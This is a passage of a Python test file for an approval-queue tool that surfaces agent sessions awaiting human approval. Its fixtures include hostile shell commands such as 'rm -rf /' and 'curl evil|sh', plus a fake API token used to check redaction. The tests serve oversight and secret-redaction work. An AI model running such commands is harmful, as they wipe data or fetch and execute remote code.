    assert summary_line(queue, BASE_TIME) == NEEDS_YOU_NONE, (
        "the bare needs-you: none is still unreachable, so U8B's observable proof "
        "has not landed"
    )


# ── Protection: the queue's one stored consequence ───────────────────────


def test_a_queue_item_protects_its_row_under_the_registry_key_it_resolved() -> None:
    """U3's contract for anything recording protection: the row's registry key
    as resolved at record time, never a bare runtime id — an alias is
    re-anchored by nothing and loses its row when the alias ages out."""
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("approval.request", {"request_id": "ap-8"}, session_id="run-1"),
            at=BASE_TIME + 1,
            seq=1,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list({"id": "run-1", "session_key": "durable-1", "status": "working"}),
        profile=PROFILE,
        at=BASE_TIME + 2,
        poll_epoch=1,
    )
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "ap-8", "command": "ship"}]}, at=BASE_TIME + 3
        ),
        profile=PROFILE,
        session_id="durable-1",
        at=BASE_TIME + 3,
    )

    # Derived, not recorded: the item is made of the row, so it followed the
    # row through the rebind with nothing to re-anchor.
    assert (PROFILE, "durable-1") in fleet.protected_keys()
    assert sync_queue(fleet).queue_item_keys == frozenset({(PROFILE, "durable-1")})
    assert [item.session_id for item in fleet_queue(fleet).items] == ["durable-1"]


def test_polled_detail_moves_with_its_row_when_the_row_learns_a_durable_id() -> None:
    """Detail left behind at the old key would strand every polled approval of a
    session the moment its first poll taught the registry its durable id."""
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("message.start", session_id="run-2"), at=BASE_TIME + 1, seq=1
        ),
        profile=PROFILE,
    )
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "ap-10"}]}, at=BASE_TIME + 2
        ),
        profile=PROFILE,
        session_id="run-2",
        at=BASE_TIME + 2,
    )
    fleet = apply_active_list(
        fleet,
        active_list({"id": "run-2", "session_key": "durable-2", "status": "working"}),
        profile=PROFILE,
        at=BASE_TIME + 3,
        poll_epoch=1,
    )

    assert set(fleet.approval_detail) == {(PROFILE, "durable-2")}
    item = fleet_queue(fleet).items[0]
    assert item.session_id == "durable-2"
    # The first sighting survived the rebind, so the floor did not jump forward.
    assert item.opened_at == BASE_TIME + 2


# ── The terminal-read settle (R14's clause, U6's fix) ────────────────────


def test_an_unservable_prompt_settles_out_of_the_registry_and_names_itself() -> None:
    """The recorded unavailable-projection defect: surfacing a failure is not
    settling one, and a prompt left registered is re-dispatched forever."""
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("terminal.read.request", {"request_id": "t-2"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    prompt = fleet.focused.prompt_for("t-2")
    assert prompt is not None

    fleet, line = latch_unservable_prompt(
        fleet,
        prompt,
        profile=PROFILE,
        reason="the transcript projection is unavailable",
        at=BASE_TIME + 11,
    )

    assert fleet.focused.prompt_for("t-2") is None
    assert "resolved-failed" in line
    assert [e.kind for e in fleet.focused.transcript][-1] == "prompt-expired"
    assert line in fleet.rows[(PROFILE, "sess-focus")].last_notice
    # Tombstoned, so a late restore cannot resurrect a bridge nothing will serve.
    assert any("t-2" in key for key in fleet.focused.flushed_prompt_ids)


# ── Decoding one polled approval ─────────────────────────────────────────


def test_a_polled_row_missing_the_allow_keys_still_decodes() -> None:
    """Four constructors feed the pending row and they do not agree — the MCP
    elicitation one builds no ``allow_permanent`` and no ``allow_session``, so a
    reader that indexed them would fail on a real reply."""
    directory = decode_pending_approvals(
        {
            "approvals": [
                {"request_id": "ap-11", "command": "ls", "description": "listing"},
                {"no_request_id": True},
                "not even a mapping",
            ]
        },
        at=BASE_TIME,
    )
    assert directory.answered is True
    assert [a.request_id for a in directory.approvals] == ["ap-11"]
    assert directory.approvals[0].summary() == "listing"


def test_a_polled_rows_text_is_redacted_here_because_the_gateway_did_not() -> None:
    """``list_gateway_approvals`` never passes rows through the payload builder
    that applies the gateway's forced redactor, and one of the four constructors
    stores its message raw. A polled row is untrusted, unredacted gateway text."""
    directory = decode_pending_approvals(
        {
            "approvals": [
                {
                    "request_id": "ap-12",
                    "command": "curl -H 'Authorization: Bearer sk-live-abcdef123456' x",
                    "description": "api_token=sk-live-abcdef123456",
                }
            ]
        },
        at=BASE_TIME,
    )
    approval = directory.approvals[0]
    assert "sk-live-abcdef123456" not in approval.command
    assert "sk-live-abcdef123456" not in approval.description
    assert "sk-live-abcdef123456" not in approval.summary()


def test_a_polled_approval_with_no_command_summarises_without_inventing_one() -> None:
    """Renamed 2026-08-17. This carried the name
    ``test_a_polled_approval_carries_its_first_sighting_into_the_queue`` and
    asserted a summary string — it touched neither the first sighting nor the
    queue, so the property its name claimed had no pin at all and deleting the
    whole preservation rule left the suite green. The property is now tested by
    :func:`test_a_polled_approval_keeps_its_first_sighting_across_later_polls`,
    and this keeps the assertion it actually makes under a name that describes
    it."""
    merged = PolledApproval(request_id="ap-13", first_seen_at=BASE_TIME)
    assert merged.summary() == "approval requested"


# ── Sanity: the queue survives a fleet with nothing in it ────────────────


def test_an_empty_fleet_builds_an_empty_queue_without_raising() -> None:
    assert FleetState().protected_keys() == frozenset()
    assert fleet_queue(FleetState()).items == ()


def test_a_polled_item_of_a_disconnected_connection_says_it_is_stale() -> None:
    """R20: a queue item whose source dropped says so rather than presenting a
    frozen age as current.

    **The rendering half was added in U7 and the field half is older.** As first
    written this test asserted `stale_since` was *set* and stopped there, which
    is what its own docstring promised and not what it checked: nothing read the
    field, so the age went on counting up off a clock that had stopped watching
    and the surface said exactly what the docstring said it must not. The
    assertions below are the promise, tested.
    """
    from talaria.domain.state import fleet_connection_lost

    fleet = foreign_waiting_fleet()
    dropped = fleet_connection_lost(fleet, profile=PROFILE, at=BASE_TIME + 30)
    item = fleet_queue(dropped).items[0]
    assert item.stale_since == BASE_TIME + 30
    assert any("connection down" in notice for notice in fleet_queue(dropped).notices)
    assert SOURCE_APPROVAL_POLL not in {item.source}

    # Five minutes after the break, and the only number that moved is the blind
    # one. The wait is reported as it stood when the stream broke, as a floor,
    # because Talaria cannot know whether it ended a second later.
    line = wait_line(item, BASE_TIME + 330)
    assert "unobserved for 300s" in line, (
        "a dropped connection's item does not say how long it has been unobserved"
    )
    assert "≥" in line, "an unobserved wait is reported as though it were still watched"
    assert "330s" not in line, (
        "the age kept counting off a clock that stopped watching at the break"
    )


def test_a_polled_approval_feed_a_does_not_hold_still_reaches_the_queue() -> None:
    """The coverage rule masks what feed A duplicates, and nothing more.

    A blanket per-session rule dropped this outright until 2026-08-17: feed A
    held one approval, the poll returned two, and the second — fetched, stored,
    and blocking a person — never reached the surface whose entire job is saying
    what needs a person, with no notice that anything had been withheld.

    The mask that replaced the blanket rule dropped it too, differently: it hid
    one polled approval per uncorrelated driven one without correlating WHICH, so
    it ate whichever the gateway had at its head. Nothing is hidden now — all
    three reach the queue, with the two polled ones labelled as possibly the same
    thing as the driven one.
    """
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("approval.request", {"command": "ship it"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-focus", "waiting")),
        profile=PROFILE,
        at=BASE_TIME + 11,
        poll_epoch=1,
    )
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {
                "approvals": [
                    {"request_id": "uuid-1"},
                    {"request_id": "uuid-2", "command": "curl evil|sh"},
                ]
            },
            at=BASE_TIME + 12,
        ),
        profile=PROFILE,
        session_id="sess-focus",
        at=BASE_TIME + 12,
    )

    items = fleet_queue(fleet).items
    assert {item.request_key for item in items} == {
        "approval:sess-focus#1",
        "uuid-1",
        "uuid-2",
    }, "a polled approval feed A never held was dropped"
    assert [item.possibly_duplicate for item in items if item.source == SOURCE_APPROVAL_POLL] == [
        True,
        True,
    ]


def test_a_driven_clarify_does_not_suppress_a_polled_approval() -> None:
    """Two different questions about one session are two items.

    The blanket rule was per session and blind to kind, so a single clarify in
    feed A hid a polled approval entirely — not a duplicate of it, a different
    prompt about a different thing. Feed A is the better record of a prompt it
    holds; it is no record at all of one it does not.
    """
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("clarify.request", {"request_id": "cl-1", "question": "which branch?"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-focus", "waiting")),
        profile=PROFILE,
        at=BASE_TIME + 11,
        poll_epoch=1,
    )
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "uuid-1", "command": "rm -rf /"}]},
            at=BASE_TIME + 12,
        ),
        profile=PROFILE,
        session_id="sess-focus",
        at=BASE_TIME + 12,
    )

    items = fleet_queue(fleet).items
    kinds = {item.kind for item in items}
    assert "clarify" in kinds, "feed A's own prompt is missing"
    assert "approval" in kinds, "a polled approval was suppressed by an unrelated kind"


def test_a_settled_approval_stays_settled_across_a_durable_rebind() -> None:
    """"Settles and latches, never restores" has to survive the ordinary case.

    The tombstone is keyed by session, and the first poll after an event-created
    row teaches that row its durable id and re-keys it. Until 2026-08-17 the
    tombstone was not re-anchored with everything else, so the settled approval
    was rebuilt under the new key and offered again — and the rebind that undoes
    it is not an edge case, it is the first poll of an ordinary session.
    """
    fleet = focused_fleet()
    fleet = apply_active_list(
        fleet,
        active_list({"id": "sess-focus", "status": "waiting"}),
        profile=PROFILE,
        at=BASE_TIME + 5,
        poll_epoch=1,
    )
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals({"approvals": [{"request_id": "gw-1"}]}, at=BASE_TIME + 6),
        profile=PROFILE,
        session_id="sess-focus",
        at=BASE_TIME + 6,
    )
    assert "gw-1" in {item.request_key for item in fleet_queue(fleet).items}

    fleet = settle_queue_item(
        fleet, profile=PROFILE, session_id="sess-focus", request_key="gw-1",
        at=BASE_TIME + 7,
    )
    assert "gw-1" not in {item.request_key for item in fleet_queue(fleet).items}

    # The first poll that carries a session_key rebinds the row to its durable id.
    fleet = apply_active_list(
        fleet,
        active_list({"id": "sess-focus", "session_key": "durable-1", "status": "waiting"}),
        profile=PROFILE,
        at=BASE_TIME + 8,
        poll_epoch=2,
    )
    assert "gw-1" not in {
        item.request_key for item in fleet_queue(fleet).items
    }, "a rebind restored a settled approval"


def test_the_queue_never_offers_an_approval_the_registry_would_refuse() -> None:
    """One rule, and both readers of it must reach the same answer.

    A settled head leaves the queue's list but not the gateway's queue: latching
    means the outcome was ambiguous, so that entry may still be sitting at the
    head, and an answer aimed at the next one would land on it. Until 2026-08-17
    the queue forgot it and offered the second approval while
    ``respond_to_prompt`` refused the very same one — a screen offering exactly
    what the registry declines, which is the failure the shared rule exists to
    make impossible.
    """
    fleet = focused_fleet()
    for index, command in enumerate(("ship it", "curl evil|sh")):
        fleet = route_frame(
            fleet,
            decoded(
                raw_event("approval.request", {"command": command, "request_id": f"gw-{index}"}),
                at=BASE_TIME + 10 + index,
                seq=20 + index,
            ),
            profile=PROFILE,
        )

    second = fleet_queue(fleet).items[1]
    assert second.blocked_reason == QUEUED_BEHIND_APPROVAL

    fleet = settle_queue_item(
        fleet,
        profile=PROFILE,
        session_id=fleet_queue(fleet).items[0].session_id,
        request_key=fleet_queue(fleet).items[0].request_key,
        at=BASE_TIME + 13,
    )

    offered = [item for item in fleet_queue(fleet).items if item.answerable]
    _, refusal = respond_to_prompt(
        fleet.focused, second.request_key, session_id="sess-focus"
    )
    assert refusal is not None, "the registry allowed what this test assumes it refuses"
    assert offered == [], "the queue offered an approval the registry refuses"


def test_a_connection_down_before_its_first_poll_is_still_named() -> None:
    """R24's rule does not have a warm-up period.

    The connection-down notice was guarded on having completed a roster poll,
    on the reasoning that calling a connection's rows stale is meaningless when
    it has no rows. True of the wording, false of the fact: a connection that
    dropped before its first poll is the one contributing least of all, and it
    was the one saying nothing at all.
    """
    fleet = probed(FleetState(focused_profile=PROFILE), OTHER)
    fleet = replace(fleet, focused_profile=PROFILE)
    fleet = fleet_connection_lost(fleet, profile=OTHER, at=BASE_TIME + 4)

    notices = fleet_queue(fleet).notices
    assert any(OTHER in notice and "down" in notice for notice in notices), notices
    assert "none" in summary_line(fleet_queue(fleet), BASE_TIME + 5)
    assert summary_line(fleet_queue(fleet), BASE_TIME + 5) != NEEDS_YOU_NONE


def test_a_polled_approval_keeps_its_first_sighting_across_later_polls() -> None:
    """KTD12's floor, pinned through the reduction rather than beside it.

    The test that carried this name asserted a summary string and never touched
    the first sighting or the queue, so deleting the whole preservation rule left
    the suite green in both legs. A ten-minute wait re-polled at minute ten must
    still render as ten minutes old, not as seconds.
    """
    fleet = foreign_waiting_fleet()
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals({"approvals": [{"request_id": "gw-1"}]}, at=BASE_TIME + 6),
        profile=PROFILE,
        session_id="sess-bg",
        at=BASE_TIME + 6,
    )
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals({"approvals": [{"request_id": "gw-1"}]}, at=BASE_TIME + 300),
        profile=PROFILE,
        session_id="sess-bg",
        at=BASE_TIME + 300,
    )

    approval = next(
        item for item in fleet_queue(fleet).items if item.request_key == "gw-1"
    )
    assert approval.opened_at == BASE_TIME + 6, "a re-poll moved the first sighting"
    assert "294s" in wait_line(approval, BASE_TIME + 300)


def test_attaching_mid_wait_hides_no_approval_and_doubles_none() -> None:
    """The review's own reproduction, which broke the second version of the rule.

    Talaria attaches to a session the gateway is already blocked on: approval
    *alpha* (``rm -rf /``) is at the head of the gateway's queue and Talaria never
    saw its request frame, so feed A has no record of it. A later approval *beta*
    (``curl evil|sh``) arrives as an event carrying no ``request_id``.

    The count-based mask consumed the polled rows positionally, so it ate alpha —
    the head, the one feed A did not have — and the queue showed ``curl evil|sh``
    twice while never showing ``rm -rf /`` at all. Both refutation targets at
    once: a duplicate from the two feeds, and a real prompt masked.
    """
    fleet = focused_fleet()
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-focus", "waiting")),
        profile=PROFILE,
        at=BASE_TIME + 9,
        poll_epoch=1,
    )
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("approval.request", {"command": "curl evil|sh"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {
                "approvals": [
                    {"request_id": "uuid-alpha", "command": "rm -rf /"},
                    {"request_id": "uuid-beta", "command": "curl evil|sh"},
                ]
            },
            at=BASE_TIME + 12,
        ),
        profile=PROFILE,
        session_id="sess-focus",
        at=BASE_TIME + 12,
    )

    items = fleet_queue(fleet).items
    commands = [item.command for item in items]
    assert "rm -rf /" in commands, "the gateway's head approval was masked away"
    assert commands.count("curl evil|sh") <= 2
    # Every distinct thing the gateway is blocked on is named exactly once.
    assert {item.request_key for item in items} == {
        "approval:sess-focus#1",
        "uuid-alpha",
        "uuid-beta",
    }


def test_a_ghost_feed_a_approval_masks_no_live_polled_one() -> None:
    """The gateway drops a queue entry on timeout and on interrupt and says
    nothing, so feed A can hold a prompt that no longer exists.

    Under the count-based mask that ghost went on masking one live polled
    approval forever, and the queue came back EMPTY for a fleet that was blocking
    on a person — the exact inversion R24 exists to prevent. Nothing is masked
    now, so the ghost is an over-report beside the real one rather than a
    silencer of it.
    """
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("approval.request", {"command": "ship it"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-focus", "waiting")),
        profile=PROFILE,
        at=BASE_TIME + 11,
        poll_epoch=1,
    )
    # The gateway timed the driven one out silently and now holds only this one.
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "uuid-new", "command": "rm -rf /"}]},
            at=BASE_TIME + 12,
        ),
        profile=PROFILE,
        session_id="sess-focus",
        at=BASE_TIME + 12,
    )

    items = fleet_queue(fleet).items
    assert "rm -rf /" in [item.command for item in items], "a live approval was masked"
    assert summary_line(fleet_queue(fleet), BASE_TIME + 13) != NEEDS_YOU_NONE


def test_the_queue_and_the_registry_agree_on_a_session_the_poll_also_answers() -> None:
    """The agreement claim, driven through a real queue this time.

    The test that carried this claim never built one: it drove a bare
    ``SessionState`` and compared ``respond_to_prompt`` against the shared rule,
    so the queue — the third reader, and the one that counts polled approvals —
    was not a party to the comparison it was named for. Reviewed and rewritten
    2026-08-17.

    The disagreement it should have caught is real. The gateway keeps ONE approval
    queue per session, and a poll's rows are entries in it, so a session with one
    driven approval and one polled one has two. The registry, seeing one, called
    it a lone approval and allowed the answer — which would have landed on
    whichever entry the gateway had at its head.
    """
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("approval.request", {"request_id": "gw-driven", "command": "ship it"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-focus", "waiting")),
        profile=PROFILE,
        at=BASE_TIME + 11,
        poll_epoch=1,
    )
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "uuid-older", "command": "rm -rf /"}]},
            at=BASE_TIME + 12,
        ),
        profile=PROFILE,
        session_id="sess-focus",
        at=BASE_TIME + 12,
    )

    items = fleet_queue(fleet).items
    driven = next(item for item in items if item.request_key == "gw-driven")
    foreign = [
        item
        for item in items
        if item.source == SOURCE_APPROVAL_POLL and item.request_key != "gw-driven"
    ]
    assert foreign, "the fixture must give the session an approval feed A lacks"

    _, told_refusal = respond_to_prompt(
        fleet.focused,
        "gw-driven",
        session_id="sess-focus",
        foreign_approvals=len(foreign),
    )
    assert bool(told_refusal) == (not driven.answerable), (
        f"queue answerable={driven.answerable} while the registry said "
        f"{told_refusal!r} for the same approval"
    )
    assert told_refusal is not None, "an approval the gateway may not have at its head was allowed"


def test_a_healthy_polled_connection_is_not_reported_as_down() -> None:
    """The notice must be rare enough to mean something.

    ``ConnectionChannel.connected`` defaults to False and was written by nothing
    but a reconnect reducer with no caller, so every successfully polled
    connection described itself as down — and the moment the queue started
    reading that field, a perfectly healthy fleet reported "part of the fleet
    could not be asked" forever. A warning that always fires is not a warning.

    A poll that answered is the evidence, and the only evidence the fleet ever
    has: the line that records it is reached because a roster reply came back.
    Both directions are asserted, because a notice that never fires is the other
    way to make this field meaningless.
    """
    fleet = foreign_waiting_fleet()
    assert fleet.channels[PROFILE].connected is True
    # Narrowed to this test's actual subject by CR7. It is about the DOWN notice
    # being rare enough to mean something; the standing unpolled-approval line is
    # a different fact about a different gap and says nothing about the socket.
    assert not any("down" in notice for notice in fleet_queue(fleet).notices), (
        "a healthy connection was called down"
    )

    dropped = fleet_connection_lost(fleet, profile=PROFILE, at=BASE_TIME + 30)
    assert any("down" in notice for notice in fleet_queue(dropped).notices)


def test_a_roster_item_is_never_answerable_even_when_its_kind_says_approval() -> None:
    """A roster item is not a prompt, and "kind" is not enough to tell them apart.

    An event can teach a row that its wait is an ``approval``. The roster item
    then carries ``kind="approval"`` while being no approval entry at all — it is
    the gateway's flattened word about a session, keyed by a request id Talaria
    minted that no gateway reply will ever name.

    Everything downstream that keyed on the kind treated it as a real entry. It
    was the only approval of its session, so the lone-approval short circuit
    returned "answerable" **before it ever looked at the request id**, and the
    item was offered with no command shown and nothing to aim at. Answering it
    would have fired ``approval.respond`` bare and popped whatever the gateway had
    at its head: approving a command the operator never saw.
    """
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event(
                "approval.request",
                {"request_id": "ap-9", "command": "rm -rf /"},
                session_id="sess-bg",
            ),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-bg", "waiting", title="background")),
        profile=PROFILE,
        at=BASE_TIME + 40,
        poll_epoch=2,
    )

    item = next(i for i in fleet_queue(fleet).items if i.source == SOURCE_ROSTER)
    assert item.kind == "approval", "the fixture must reach the dangerous state"
    assert item.command == "", "the roster carries no command, which is the point"
    assert item.answerable is False
    assert "open the session" in item.blocked_reason


def test_a_roster_item_does_not_take_the_head_from_a_real_approval() -> None:
    """The same defect's other half, which fails the opposite way.

    Both a roster item and a polled approval carry a floor age, so the mixed-feed
    guard read them as one feed and granted headship — to the synthetic one,
    whose floor predates the approval's first sighting. The genuinely answerable
    approval was then refused as queued behind it, and nothing ever resolves a
    roster item on its own, so it stayed unanswerable indefinitely.
    """
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event(
                "approval.request",
                {"request_id": "ap-9", "command": "rm -rf /"},
                session_id="sess-bg",
            ),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-bg", "waiting", title="background")),
        profile=PROFILE,
        at=BASE_TIME + 40,
        poll_epoch=2,
    )
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "gw-1", "command": "ls -la"}]},
            at=BASE_TIME + 50,
        ),
        profile=PROFILE,
        session_id="sess-bg",
        at=BASE_TIME + 50,
    )

    real = next(i for i in fleet_queue(fleet).items if i.request_key == "gw-1")
    assert real.answerable is True, f"the real approval was blocked: {real.blocked_reason}"


def test_an_aged_out_alias_does_not_double_a_driven_approval() -> None:
    """One approval, two feeds, and a session id that no longer resolves.

    The runtime-alias index is bounded at four ids per row, so a prompt registered
    under a runtime id can outlive the alias mapping it to its row. Feed A then
    keys by a session nothing answers to while feed B keys by the durable row, the
    identities differ, and the same approval is emitted twice with both copies
    answerable and neither flagged.

    A gateway-supplied request id is the same string on both sides, so it names
    the row the prompt belongs to. That is a derivation and not a guess, which is
    the distinction this unit's dedupe now turns on everywhere.
    """
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("approval.request", {"request_id": "gw-7", "command": "rm -rf /"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list({"id": "sess-focus", "session_key": "dur-1", "status": "waiting"}),
        profile=PROFILE,
        at=BASE_TIME + 11,
        poll_epoch=1,
    )
    for index in range(MAX_RUNTIME_ALIASES + 1):
        fleet = apply_active_list(
            fleet,
            active_list({"id": f"rt-{index}", "session_key": "dur-1", "status": "waiting"}),
            profile=PROFILE,
            at=BASE_TIME + 12 + index,
            poll_epoch=2 + index,
        )
    assert ("default", "sess-focus") not in fleet.aliases, "the alias must have aged out"

    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "gw-7", "command": "rm -rf /"}]},
            at=BASE_TIME + 40,
        ),
        profile=PROFILE,
        session_id="dur-1",
        at=BASE_TIME + 40,
    )

    approvals = [i for i in fleet_queue(fleet).items if i.request_key == "gw-7"]
    assert len(approvals) == 1, "one approval was emitted twice under two session keys"
    assert approvals[0].session_id == "dur-1", "the item was not re-anchored to its row"


def test_a_settled_roster_item_shadows_no_later_approval() -> None:
    """A status word settles like anything else, and shadows nothing.

    The settled-shadow counter keeps a latched approval in the head-of-queue
    accounting, because latching means the outcome was ambiguous and the gateway
    may still hold that entry. A roster item is not an entry the gateway holds,
    so it can shadow nothing — but the counter tested only the kind, and an event
    can teach a roster row that its wait is an ``approval``.

    A shadow both suppresses headship and inflates ``queued_count``, and the
    tombstone is permanent, so one settled roster item made every later approval
    on that session unanswerable for the rest of the run.
    """
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event(
                "approval.request",
                {"request_id": "ap-9", "command": "rm -rf /"},
                session_id="sess-bg",
            ),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-bg", "waiting", title="background")),
        profile=PROFILE,
        at=BASE_TIME + 40,
        poll_epoch=2,
    )
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "gw-1", "command": "ls -la"}]},
            at=BASE_TIME + 50,
        ),
        profile=PROFILE,
        session_id="sess-bg",
        at=BASE_TIME + 50,
    )
    roster = next(i for i in fleet_queue(fleet).items if i.source == SOURCE_ROSTER)
    assert roster.kind == "approval", "the fixture must reach the dangerous state"

    fleet = settle_queue_item(
        fleet,
        profile=PROFILE,
        session_id=roster.session_id,
        request_key=roster.request_key,
        at=BASE_TIME + 60,
    )

    real = next(i for i in fleet_queue(fleet).items if i.request_key == "gw-1")
    assert real.answerable is True, f"a settled status word blocked it: {real.blocked_reason}"

    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "gw-2", "command": "whoami"}]},
            at=BASE_TIME + 90,
        ),
        profile=PROFILE,
        session_id="sess-bg",
        at=BASE_TIME + 90,
    )
    later = next(i for i in fleet_queue(fleet).items if i.request_key == "gw-2")
    assert later.answerable is True, f"the tombstone was permanent: {later.blocked_reason}"


def test_an_aged_out_alias_with_no_gateway_id_labels_the_doubt() -> None:
    """The anchor recovery keyed on the registry key, which is not the gateway's.

    ``QueuePrompt.request_id`` is the registry key: the gateway's id when one was
    observed, and a locally synthesized ``approval:<session>#<n>`` when the
    gateway sent none. The anchor map is built from gateway ids only, so keying
    the recovery on the registry key silently missed every keyless-gateway
    prompt — the exact shape ``UNCORRELATED_APPROVAL`` and ``possibly_duplicate``
    exist to support — and the doubling came back with neither copy flagged.

    Correlation is genuinely impossible here, so the fix is not to pick a row.
    Both copies stay, and the one that cannot be shown to belong anywhere carries
    the doubt.
    """
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("approval.request", {"command": "rm -rf /"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list({"id": "sess-focus", "session_key": "dur-1", "status": "waiting"}),
        profile=PROFILE,
        at=BASE_TIME + 11,
        poll_epoch=1,
    )
    driven = next(i for i in fleet_queue(fleet).items if i.source == SOURCE_DRIVEN)
    assert not driven.observed_request_id, "the fixture must reach the keyless state"

    for index in range(MAX_RUNTIME_ALIASES + 1):
        fleet = apply_active_list(
            fleet,
            active_list({"id": f"rt-{index}", "session_key": "dur-1", "status": "waiting"}),
            profile=PROFILE,
            at=BASE_TIME + 12 + index,
            poll_epoch=2 + index,
        )
    assert ("default", "sess-focus") not in fleet.aliases, "the alias must have aged out"

    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "gw-7", "command": "rm -rf /"}]},
            at=BASE_TIME + 40,
        ),
        profile=PROFILE,
        session_id="dur-1",
        at=BASE_TIME + 40,
    )

    approvals = [i for i in fleet_queue(fleet).items if i.kind == "approval"]
    assert len(approvals) == 2, "correlation is impossible here; both copies must stay"
    orphan = next(i for i in approvals if i.source == SOURCE_DRIVEN)
    assert orphan.possibly_duplicate is True, "the uncorrelated copy carried no doubt"


def test_a_phantom_blocks_itself_but_not_its_id_carrying_polled_copy() -> None:
    """The blind phantom is refused with its own reason; the aimed copy is not.

    Same state as ``test_an_aged_out_alias_with_no_gateway_id_labels_the_doubt``.
    The driven copy is keyless — answering it would send a bare
    ``approval.respond``, popping the gateway's FIFO head, a different command
    than the row the operator clicked — so it stays refused, with the
    phantom's own sentence naming the age-out that clears it. The **polled** copy of
    the same approval carries the gateway's ``request_id`` (``gw-7``), and an
    answer carrying one is aimed by id: ``resolve_gateway_approval``
    (``tools/approval.py:2655-2658``) selects entries by id on the ``if
    request_id:`` arm and returns 0 on no match, with the head-pop
    structurally unreachable, so that answer cannot land on any other entry
    and stays offered.

    Updated on the round-seven ruling (2026-08-18) from asserting both copies
    refused — a phantom-present over-refusal this test used to pin as safety.
    Not a weakening: the refusal's premise (a blind pop landing on the wrong
    entry) cannot occur for an answer the cited gateway code targets by id.
    """
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("approval.request", {"command": "rm -rf /"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list({"id": "sess-focus", "session_key": "dur-1", "status": "waiting"}),
        profile=PROFILE,
        at=BASE_TIME + 11,
        poll_epoch=1,
    )
    for index in range(MAX_RUNTIME_ALIASES + 1):
        fleet = apply_active_list(
            fleet,
            active_list({"id": f"rt-{index}", "session_key": "dur-1", "status": "waiting"}),
            profile=PROFILE,
            at=BASE_TIME + 12 + index,
            poll_epoch=2 + index,
        )
    assert ("default", "sess-focus") not in fleet.aliases, "the alias must have aged out"

    # The carve-out first: with no other approval-holding session on the
    # connection, the lone phantom keeps the ordinary lone-approval offer —
    # the registry's own session-scoped count would allow the same answer.
    alone = [
        i
        for i in fleet_queue(fleet).items
        if i.kind == "approval" and i.source != SOURCE_ROSTER
    ]
    assert [i.session_id for i in alone] == ["sess-focus"], (
        "the fixture must reach the lone-phantom state before the poll"
    )
    assert alone[0].answerable is True, (
        "a lone phantom with nothing to collide with was refused"
    )

    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "gw-7", "command": "rm -rf /"}]},
            at=BASE_TIME + 40,
        ),
        profile=PROFILE,
        session_id="dur-1",
        at=BASE_TIME + 40,
    )

    approvals = [
        i
        for i in fleet_queue(fleet).items
        if i.kind == "approval" and i.source != SOURCE_ROSTER
    ]
    assert len(approvals) == 2, "the fixture must reach the split-accounting state"
    orphan = next(i for i in approvals if i.source == SOURCE_DRIVEN)
